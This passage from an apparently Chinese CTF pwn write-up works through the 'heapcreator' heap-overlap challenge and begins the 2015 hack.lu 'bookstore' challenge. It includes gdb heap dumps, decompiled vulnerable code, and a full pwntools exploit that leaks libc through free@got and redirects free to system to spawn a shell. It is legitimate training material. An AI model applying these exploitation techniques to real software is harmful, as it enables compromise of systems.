<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5160</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5170</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5180</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></li>
<li>free掉第1块，这时候free了一个0x40大小的堆块和一个0x20大小的堆块<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">50</span>gx <span class="number">0xf89030</span><span class="number">-0x30</span></span><br><span class="line"><span class="number">0xf89000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0xf89010</span>:	<span class="number">0x0000000000000018</span>	<span class="number">0x0000000000f89030</span></span><br><span class="line"><span class="number">0xf89020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0xf89030</span>:	<span class="number">0x0068732f6e69622f</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0xf89040</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x0000000000000041</span> <span class="meta">#free 0x40大小</span></span><br><span class="line"><span class="number">0xf89050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000f89070</span></span><br><span class="line"><span class="number">0xf89060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> <span class="meta">#free 0x21大小</span></span><br><span class="line"><span class="number">0xf89070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020f81</span></span><br><span class="line"><span class="number">0xf89090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf890a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf890b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf890c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf890d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf890e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf890f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89110</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89120</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89130</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89140</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89150</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89160</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89170</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89180</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></li>
<li>这时候create(0x30)的话，会先创建结构体的堆块，这时候fastbin链上有刚free掉的堆块，所以优先使用，创建了0x20大小堆块，然后在创建一个0x40的chunk，这时候可以覆盖掉他的结构体部分的内容指针，泄露地址，在写入就成了</li>
</ol>
<h3 id="1-1-4-exp"><a href="#1-1-4-exp" class="headerlink" title="1.1.4. exp"></a>1.1.4. exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'heapcreator'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'heapcreator'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = ctx.start()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e.args)</span><br><span class="line">        print(<span class="string">"It can't work,may be it can't load the remote libc!"</span>)</span><br><span class="line">        print(<span class="string">"It will load the local process"</span>)</span><br><span class="line">        io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line">heap = elf</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    free_got = <span class="number">0x602018</span></span><br><span class="line">    create(<span class="number">0x18</span>, <span class="string">"1111"</span>)  <span class="comment"># 0</span></span><br><span class="line">    create(<span class="number">0x10</span>, <span class="string">"2222"</span>)  <span class="comment"># 1</span></span><br><span class="line">    <span class="comment"># overwrite heap 1's struct's size to 0x41</span></span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">"a"</span> * <span class="number">0x10</span> + <span class="string">"\x41"</span>)</span><br><span class="line">    <span class="comment"># trigger heap 1's struct to fastbin 0x40</span></span><br><span class="line">    <span class="comment"># heap 1's content to fastbin 0x20</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># new heap 1's struct will point to old heap 1's content, size 0x20</span></span><br><span class="line">    <span class="comment"># new heap 1's content will point to old heap 1's struct, size 0x30</span></span><br><span class="line">    <span class="comment"># that is to say we can overwrite new heap 1's struct</span></span><br><span class="line">    <span class="comment"># here we overwrite its heap content pointer to free@got</span></span><br><span class="line">    create(<span class="number">0x30</span>, p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x30</span>) + p64(heap.got[<span class="string">'free'</span>]))  <span class="comment">#1</span></span><br><span class="line">    <span class="comment">#create(0x30, p64(0x1234567890))  #1</span></span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    <span class="comment"># leak freeaddr</span></span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">"Content : "</span>)</span><br><span class="line">    data = r.recvuntil(<span class="string">"Done !"</span>)</span><br><span class="line"></span><br><span class="line">    free_addr = u64(data.split(<span class="string">"\n"</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">    libc_base = free_addr - libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">    log.success(<span class="string">'libc base addr: '</span> + hex(libc_base))</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    <span class="comment">#gdb.attach(r)</span></span><br><span class="line">    <span class="comment"># overwrite free@got with system addr</span></span><br><span class="line">    edit(<span class="number">1</span>, p64(system_addr))</span><br><span class="line">    <span class="comment"># trigger system("/bin/sh")</span></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="1-2-2015-hacklu-bookstore"><a href="#1-2-2015-hacklu-bookstore" class="headerlink" title="1.2. 2015 hacklu bookstore"></a>1.2. 2015 hacklu bookstore</h2><h3 id="1-2-1-功能分析"><a href="#1-2-1-功能分析" class="headerlink" title="1.2.1. 功能分析"></a>1.2.1. 功能分析</h3><p>先进行功能分析</p>
<ol>
<li>有编辑功能，编辑已存在的1,2堆块，可溢出</li>
<li>删除功能，删除已存在的1,2堆块，uaf</li>
<li>合并功能，将1,2两个堆块合并,格式化字符串</li>
</ol>
<h3 id="1-2-2-漏洞点分析"><a href="#1-2-2-漏洞点分析" class="headerlink" title="1.2.2. 漏洞点分析"></a>1.2.2. 漏洞点分析</h3><ol>
<li>漏洞点1(任意写，\n才结束)</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">edit_order</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> cnt; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  cnt = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v3 != <span class="string">'\n'</span> )<span class="comment">//关键点</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = fgetc(<span class="built_in">stdin</span>);</span><br><span class="line">    idx = cnt++;</span><br><span class="line">    a1[idx] = v3;</span><br><span class="line">  &#125;</span><br><span class="line">  a1[cnt - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>漏洞点2(uaf)</li>
</ol>
<p>free后指针没置空</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">delete_order</span><span class="params">(<span class="keyword">void</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">free</span>(a1); <span class="comment">//重点</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>格式化字符串</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+4h] [rbp-BCh]</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// [rsp+8h] [rbp-B8h]</span></span><br><span class="line">  <span class="keyword">char</span> *first_order; <span class="comment">// [rsp+18h] [rbp-A8h]</span></span><br><span class="line">  <span class="keyword">char</span> *second_order; <span class="comment">// [rsp+20h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">char</span> *dest; <span class="comment">// [rsp+28h] [rbp-98h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+30h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+B8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  first_order = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">  second_order = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">  dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !first_order || !second_order || !dest )</span><br><span class="line">  &#123;</span><br><span class="line">    fwrite(<span class="string">"Something failed!\n"</span>, <span class="number">1u</span>LL, <span class="number">0x12</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">" _____          _   _                 _          _                   _ \n"</span></span><br><span class="line">    <span class="string">"/__   \\_____  _| |_| |__   ___   ___ | | __  ___| |_ ___  _ __ ___  / \\\n"</span></span><br><span class="line">    <span class="string">"  / /\\/ _ \\ \\/ / __| '_ \\ / _ \\ / _ \\| |/ / / __| __/ _ \\| '__/ _ \\/  /\n"</span></span><br><span class="line">    <span class="string">" / / |  __/&gt;  &lt;| |_| |_) | (_) | (_) |   &lt;  \\__ \\ || (_) | | |  __/\\_/ \n"</span></span><br><span class="line">    <span class="string">" \\/   \\___/_/\\_\\\\__|_.__/ \\___/ \\___/|_|\\_\\ |___/\\__\\___/|_|  \\___\\/   \n"</span></span><br><span class="line">    <span class="string">"Crappiest and most expensive books for your college education!\n"</span></span><br><span class="line">    <span class="string">"\n"</span></span><br><span class="line">    <span class="string">"We can order books for you in case they're not in stock.\n"</span></span><br><span class="line">    <span class="string">"Max. two orders allowed!\n"</span>);</span><br><span class="line">LABEL_14:</span><br><span class="line">  <span class="keyword">while</span> ( !v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"1: Edit order 1"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"2: Edit order 2"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"3: Delete order 1"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"4: Delete order 2"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"5: Submit"</span>);</span><br><span class="line">    fgets(&amp;s, <span class="number">0x80</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( s )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'1'</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Enter first order:"</span>);</span><br><span class="line">        edit_order(first_order);</span><br><span class="line">        <span class="built_in">strcpy</span>(dest, <span class="string">"Your order is submitted!\n"</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'2'</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Enter second order:"</span>);</span><br><span class="line">        edit_order(second_order);</span><br><span class="line">        <span class="built_in">strcpy</span>(dest, <span class="string">"Your order is submitted!\n"</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'3'</span>:</span><br><span class="line">        delete_order(first_order);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'4'</span>:</span><br><span class="line">        delete_order(second_order);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'5'</span>:</span><br><span class="line">        v5 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x140</span>uLL);</span><br><span class="line">        <span class="keyword">if</span> ( !v5 )</span><br><span class="line">        &#123;</span><br><span class="line">          fwrite(<span class="string">"Something failed!\n"</span>, <span class="number">1u</span>LL, <span class="number">0x12</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">        &#125;</span><br><span class="line">        submit(v5, first_order, second_order);</span><br><span class="line">        v4 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s"</span>, v5);</span><br><span class="line">  <span class="built_in">printf</span>(dest);<span class="comment">//格式化字符串</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="1-2-3-漏洞利用过程"><a href="#1-2-3-漏洞利用过程" class="headerlink" title="1.2.3. 漏洞利用过程"></a>1.2.3. 漏洞利用过程</h3><p>这题有三个明显的洞，比原来那些只有一个洞的看起来似乎简单些？实际相反，这道题利用起来难度比前面的还大，因为这个洞不好利用，我自己研究了好久也无果，然后找writeup<br>看了看雪大佬的文章才知道这题怎么利用的</p>
<p>开始我在想如何利用格式化字符串的洞，因为格式化字符串的洞在合并过后才会使用，而我没想到什么便捷方法能修改第三块堆块的内容，他只能被覆盖为默认的<strong>Your order is submitted!\n</strong>，后来才知道用overlaping后可以覆盖到第三块堆块的内容，不过还是得精心布置堆才可以利用到</p>
<ol>
<li>开头程序malloc(0x80)申请了三个堆块，我们将第二块free掉</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/100gx 0x1b8d010-0x010</span><br><span class="line">0x1b8d000:	0x0000000000000000	0x0000000000000091 <span class="comment">#堆块1</span></span><br><span class="line">0x1b8d010:	0x0000000074736574	0x0000000000000000</span><br><span class="line">0x1b8d020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d090:	0x0000000000000000	0x0000000000000091 <span class="comment">#堆块2，溢出修改处</span></span><br><span class="line">0x1b8d0a0:	0x0000000000000000	0x0000000000000000 <span class="comment">#数据部分</span></span><br><span class="line">0x1b8d0b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d0c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d0d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d0e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d0f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d120:	0x0000000000000000	0x0000000000000091 <span class="comment">#堆块3</span></span><br><span class="line">0x1b8d130:	0x64726f2072756f59	0x7573207369207265</span><br><span class="line">0x1b8d140:	0x2164657474696d62	0x000000000000000a</span><br><span class="line">0x1b8d150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d180:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d190:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d1a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d1b0:	0x0000000000000000	0x0000000000000411</span><br><span class="line">0x1b8d1c0:	0x696d627553203a35	0x20726564726f0a74</span><br><span class="line">0x1b8d1d0:	0x216465776f0a0a32	0x6163206e6920750a</span><br><span class="line">0x1b8d1e0:	0x2779656874206573	0x6920746f6e206572</span><br><span class="line">0x1b8d1f0:	0x2e6b636f7473206e	0x5f0a216e6f69740a</span><br><span class="line">0x1b8d200:	0x0a2020202f5c5f5f	0x0000000000000000</span><br><span class="line">0x1b8d210:	0x0000000000000000	0x0000000000000000</span><br><span 